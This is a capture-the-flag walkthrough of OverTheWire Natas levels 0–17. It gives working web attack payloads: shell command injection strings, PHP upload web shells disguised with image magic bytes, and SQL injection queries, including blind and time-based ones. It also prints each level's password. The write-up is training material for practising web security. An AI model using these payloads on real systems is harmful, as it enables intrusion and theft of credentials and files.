# Natas OverTheWire

Date: Jul 8, 2020
Progress: Submitted
Tags: natas, practical, week5

# Level 0

- The Natas OverTheWire is kicked off by loging in to  a website whose URL, `username` and `password` is provided.

# Level 0 → Level 1

- The logged in natas0 webpage does not look promising and therefore, we inspect it's source code to find the `password` for level 1 commented in the body.
- Password: `gtVrDuiDfck831PqWsLEZy5gyDz1clto`

# Level 1 → Level 2

## Problem Statement

- Well, the Level 1 webpage isn't any different from that of the Level 0 except for the fact that Right Clicking is disabled.

## Hack

- We don't necessarily need the right click to be able to inspect code, a simple `Ctrl + Shift + i` works like a charm.
- Alternatively, right click can be enabled back by:
- Either way, we find the passeord to level 2 commented on the source code
- `Password`: `ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi`

# Level 2 → Level 3

### Problem Statement

- While the Level 2 webpage claims that there is nothing on the page, we sneak a peek into it's source code. Sure enough, mentioned in the body, is a source directory of some image file `files/pixel.png`

### Hack

- We check out the `/files` directory from the URL to discover lists of files one of which is `users.txt`
- The text file contains login credentials for different users inclusing `natas3`!
- Password: `sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14`

# Level 3 → Level 4

### Problem Statement

- In the source code for `natas3` webpage, is a comment that tells us "Not even Google will find it this time...". Huh?

### Hack

- We know file `robots.txt` in any webpage handles how google  is to process links to the site. We head to the `/robot.txt` directory that reveals that for any User-agent, google must "Disallow" a directory `/s3cr3t/` . Ironic!
- The `/s3cr3ct` directory in the web page contains a file `users.txt` with details on login credentials for user `natas4`
- Password: `Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ`

# Level 4 → Level 5

### Problem Statement

- The web-page does not allow access to anyone unless they are from "[http://natas5.natas.labs.overthewire.org/](http://natas5.natas.labs.overthewire.org/)"

### Burpsuite Background

- A proxy server is a server that acts as an intermediary for requests from clients seeking resources from other servers.
- Intercepting with burpsuite proxy lets us alter the requests we can send out to the server as a client.

### Hack

- Therefore we set up a proxy on burpsuite and intercept the target, [natas4.natas.labs.overthewire.org](http://natas4.natas.labs.overthewire.org/). We can check the established proxy by `Forward`-ing default request to the server, this should load the webpage on the browser.
- Next, `Action` → `Send to Repeater` such that we can send out requests and monitor the response of the server. Under the `Headers` option we add a header `Referer` with its value as [`http://natas5.natas.labs.overthewire.org/`](http://natas5.natas.labs.overthewire.org/)
- The Referer request header contains the address of the previous web page from which a link to the currently requested page was followed
- Finally, we can check out the html response of the server upon the addition of the request header and discover in the body, the password to the user `natas5`
- Password: `iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq`

# Level 5 → Level 6

### Problem Statement

- The `natas5` web page displays up a message "Access Disallowed. You are not logged in." even when we login to the page.
- We inspect the source code and realize that a cookies has been set up upon login and one of which is a cookie of the name `loggedin` and a value `0` assigned to it.

### Hack

- Hmm, how about we manually edit out the cookie value to `1`? It Works! The webpage now displays the login credentials for `natas6`
- Password: `aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1`

# Level 6 → Level 7

### Problem Statement

- The webpage for `natas6` has a form that asks for some kind of "secret" for us to be able to find the password for Level 7
- We inspect the source code that has the following .php code:

```php
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```

- It is apparent from the above code that the variable `$secret`is being read from directory "includes/secret.inc" in the webpage.

### Hack

- Well, let's check out [http://natas6.natas.labs.overthewire.org/includes/secret.inc](http://natas6.natas.labs.overthewire.org/includes/secret.inc) . Guess what we just stumbled into?  The secret: `FOEIUWGHFEEUHOFUOIU`
- We enter the "secret" into the form in the home page and the server responds with the password to Level 7
- Password: `7z3hEENjQtflzgnT29q7wAvMNfZdh0i9`

# Level 7 → Level 8

### Problem Statement

- The web page seems to be making use of "Local File Inclusion" to display the contents of files, `About` or `Home`

### Hack

- We peek into the source code for clues on any local directory i the sever. Sure enough, commented on the code is the directory for the pass-code for level 8
- We can directly access the directory from the URL but the server would mistake the `/` sign in the directory for directory on the web-page. We don't want that to happen, and therefore bypass this filter by using its unicode equivalent such that the URL is:

```
http://natas7.natas.labs.overthewire.org/index.php?page=%2Fetc%2Fnatas_webpass%2Fnatas8
```

- Password: `DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe`

# Level 8 → Level 9

### Problem Statement

- The `natas8` web-page again, has a form for us to enter a "secret"

### Hack

- We inspect the source code and find a function `encodeSecret()` that generates this "secret" by encoding a message with base64, reversing it and finally, encoding the outcome with hexadecimal system. The code also has a `$encodedsecret` variable with `3d3d516343746d4d6d6c315669563362` value assigned to it. Clearly, this the encoded result of some "secret", returned by the aforementioned function.
- What we can do is reverse the entire process of the function to get to the secret message.

```python
import base64

secret = "3d3d516343746d4d6d6c315669563362"
hex_bytes = bytes.fromhex(secret)
reversed = hex_bytes[::-1]
decoded_secret = base64.decodebytes(reversed)

print(decoded_secret)
```

- Secret: `oubWYf2kBq`, Password: `W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl`

# Level 9 → Level 10

### Problem Statement

- The web-page for `natas9` has a form that looks for words containing the inputted `key`
- The source code reveals a .php code shown below

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

- Code Breakdown:
    1. a variable `$key` is initialized with an empty string
    2. The `array_key_exits` function looks like it returns some boolean value after checking  if variable $_Request = "needle". If true, the word "needle" is assigned to `$key`
    3.  Once, the key is an non-empty string, the `passthru` function is called. The function executes commands just like we would in command line. 
- It should be noted that, the variable `$key` can be assigned whichever value users please through the form. It's no co-incidence that the variable is  also the part of `passthru` command. We can inject a command using the vulnerable key!

### Hack

- Let's test what we just discovered using the webpage form

```bash
#Find words containing: 
; ls
# Lists files in the web-age directory
# Find words containing: 
; cat /etc/natas_webpass/natas10
# We cracked it!
```

- Password: `nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`

# Level 10 → Level 11

### Problem Statement

- The `natas10`  webpage features the same form from natas9 except this time they have filters for characters like `;` and `&` . Meaning, we cannot terminate the command using semicolon like we did in the previous level.

### Hack

- What we can now do is play along, pass a key such that `grep` command searches for any character in the file **/etc/natas_webpass/natas11** and comments out the reference to dictionary.txt

```bash
# Find words Containing
.* /etc/natas_webpass/natas11 #
# Outputs /etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
```

- Password: `U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK`

# Level 11 → Level 12

### Problem Statement

- The source code for level 11 web-page reveals that it adds the color of the background into our cookie. Also, the cookie contains the field `showpassword` that is set to "no".
- The cookie has been xor encrypted before being embeded to our machine. If we were to somehow,  find the key to the xor encryption, we could embed a new encrypted cookie with `showpassword` field set to a "yes".
- The following function(a part of the source code) shows exactly what goes into creating a cookie:

```php
function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}
```

- We know the plain text equivalent of the encrypted cookie, shown as follows:

```
cookie = b"ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw="
plain_text = {"showpassword":"no", "bgcolor":"#ffffff"}

```

### Hack

- We write a python code for known plaintext attack.
- The known- key outputs repeated key as:

```php
qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
```

- Having known the key we write yet another code to create a new cookie with `showpassword` set as "yes"

### Code

- Known plaintext attack: [https://gist.github.com/rachuacharya/cc84920b605e7b6b5e76d7079799bf78](https://gist.github.com/rachuacharya/cc84920b605e7b6b5e76d7079799bf78)
- Repeated key Encryption: [https://gist.github.com/rachuacharya/a8143df197f250d9d959835090b9105f](https://gist.github.com/rachuacharya/a8143df197f250d9d959835090b9105f)
- The code outputs the new cookie for us: `ClVLIh4ASCsCBE8lAxMacFFVQS8CVRRqUxVfKR4bVzhTTRhoUhFeLBcRXmg`. Upon manually changing the cookie value on the browser, we are shown the natas12 password
- Password: `EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3`

# Level 12 → Level 13

### Problem Statement

- The form on the `natas12` web-page lets us browse  on our local machine for a .jpg file. Once a file is chosen, a separate button lets us `Upload` it. Underneath the hood, immediately after we choose a file the server assigns a random name under which it will store the file. The file extension is strictly .jpg
- What we can do is find a way to upload a .php file with codes to execute command line and display contents of password file.

```php

echo "<?php echo passthru(\"cat /etc/natas_webpass/natas13\"); ?>" > natas12.php
```

- The back-end code running on the server makes use of  `$_POST["filename"]` which will be used by the function `makeRandomPathFromFilename` to generate a file name. We cannot change the code on the server side to assign a different value to `$ext` variable.

### Hack

- We might be able to change the front-end, html code on our browser after it assigns some random_name.jpg to the file. Unbeknownst to the server, we manually edit the `filename` attribute to replace the .jpg with .php.
- We hit the submit button after tweaking the html code. A link on the browser directs us to the recently uploaded file only to find `natas13` password on the page displayed on the page.
- Our php code was successfully executed because the browser knew before-hand that our file was .php. It took care of the file accordingly.
- Password: `jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY`

# Level 13 → Level 14

- `natas13` features the same form as in the previous level, except it exclusively allows .jpg files only for uploads. For any other file type an error message is displayed.
- The source code reveals that the filter uses the "Magic Number" on image files as a metric to check if they really are images. Magic Number is a number embedded at or near the beginning of a file that indicates its file format (i.e., the type of file it is). The function that checks for such numbers in php is `exif_imagetype()` .
- We can bypass the `exif_imagetype()` function if we were to manually embed magic numbers as the start of the .php files. The file would pass through the filter and would execute the same way it did on previous level.
- So, we embed the magic number onto a .php file along with the `passthru` function for reading password. The `-e` flag makes sure that the backslash-es are interpreted for what they are instead of escape characters. This is necessary because the magic numbers must be read as hex values and not as some ascii characters

```bash
echo -n -e '\xFF\xD8\xFF\xE0 <?php passthru("cat /etc/natas_webpass/natas14"); ?>' > natas13.php
```

- Password: `Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1`

# Level 14 → Level 15

### Problem Statement

- The natas14 features a form with entries for `Username` and `password`. At the back-end the database is managed using sql query of the hypothesis:

```sql
SELECT * FROM users WHERE username = "username" AND password = "password"
```

- We can inject a sql query through username so that the WHERE statement is satisfied and reference to the password is commented out.

### Hack

- Enter username such that the injected query looks like:

```sql
SELECT * FROM users WHERE username = "" OR 1=1 #
```

- We are logged in to a page that reveals the password to `natas15`
- Password: `AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J`

# Level 15 → Level 16

### Problem Statement

- The web-page for level 15 features a form with an entry-box for `Username`. Based on the existence of the entered `username` in the database, the web-page displays message like "This user exits." or "This user doesn't exist".
- The source code uses sql query to extract information from the database but under no circumstance does it allow the web-page to display any information on the database except for the message involving the existence of a username.

```sql
SELECT * FROM users WHERE username = "username"; 
```

### Hack

- We can use the `Username` field to inject queries to check if certain letters in the `password` for username `natas16` exist. If true, the web-page returns a "This user exists" message and if not "This user doesn't exist" .
- Starting with the first letter of the `password` we compare it against all possible characters using binary search algorithm. Once a match has been found we proceed to the next "position", so on and so forth.  The injection queries for comparison are as follows:

```sql
#natas16" AND BINARY substr(password, position, 1) = "some_char"  # 
test_query_equal = 'natas16" AND BINARY substr(password,' + str(position) + ', 1) = "' + all_characters[check_index] + '" #'

# natas16" AND BINARY substr(password, position, 1) >  "some_char"  # 
test_query_greater = 'natas16" AND BINARY substr(password,' + str(position) + ', 1) > "' + all_characters[check_index] + '"#'

# natas16" AND BINARY substr(password, position, 1) < "some_char"  # 
test_query_lesser = 'natas16" AND BINARY substr(password,' + str(position) + ', 1) < "' + all_characters[check_index] + '"#'
```

### Code:

- [https://gist.github.com/rachuacharya/e6511355e55cd26d7808a6bc027f505f](https://gist.github.com/rachuacharya/e6511355e55cd26d7808a6bc027f505f)
- Password: `WaIHEacj63wnNIBROHeqi3p9t0m5nhmh`

# Level 16 → Level 17

### Problem Statement

- The `natas16` web-page contains a form like the ones in `natas9` and `natas10` but this time it has even more filters. An input is valid as long as it does not contain characters like: `;`, `'`, `"`, `&` , `|`, and ``` (backtick).
- If an input is valid, it is assigned to a variable `$key`. The variable is a part of an argument to a `passthru` function shown as below:

```php
passthru("grep -i \"$key\" dictionary.txt");
```

- It is possible to inject commands into the input field of the form. The injected input/command will be then concatenated to the original `passthru` argument before being executed. But whatever command we inject, the **web-page will ONLY output words that are in dictionary.txt** and clearly, the password to `natas17` isn't one of them.

### Hack

- We make use of `$()` operator or command substitution operator. Any command inside the operator gets executed first, such that its output becomes the input to the command outside the operator. The following example shows a key and corresponding passthru command

```php
$key = $(grep -E ^{test_password}.* /etc/natas_webpass/natas17)absent
# The output of grep command inside key is input to the outer grep
passthtu = ("grep -i $(grep -E ^a.* /etc/natas_webpass/natas17)absent dictionary.txt")
```

- In the command inside `$key`: grep searches  file **/etc/natas_webapass/natas17** for words starting with "a". If the password does start with the letter "a" the inside-grep outputs the password, if not the inside grep returns nothing.
- Based on the output of inner-grep the outer-grep function returns either nothing or the word "absent".
- Here,  "absent"  is a flag which suggests that the password DOES not start with the letter "a". Just a reminder, we can use any word in dictionary.txt as flag!
- Finally we write a python code that tests all possible combination of characters that `natas17` password starts with. Once a match has been made, we append to it other possible characters and proceed checking so on and so forth.

### Code

- [https://gist.github.com/rachuacharya/d09a9be1b9c524507405d45dfc592ea5](https://gist.github.com/rachuacharya/d09a9be1b9c524507405d45dfc592ea5)
- Password: `8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw`

# Level 17 → Level 18

### Problem Statement

- The `level17` web-page features a form similar to that of `level15`. However, this time the webpage does not display any kind of response message. So how do we know if the query we have injected is producing a right or a wrong response.
- What we can do in situation like this is, we could suffix a `sleep()` function to our injection query. If the query is valid then the `sleep()` function will kick in and server delays its response.

### Hack

- Judging by the response time of a query we compare the `password` characters against all possible characters using binary search algorithm.
- Since time is a metric, slow internet might result in wrong prediction of the password.

### Code:

- [https://gist.github.com/rachuacharya/842e4370b277b9d8015f366c1125b764](https://gist.github.com/rachuacharya/842e4370b277b9d8015f366c1125b764)
- Password: `xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP`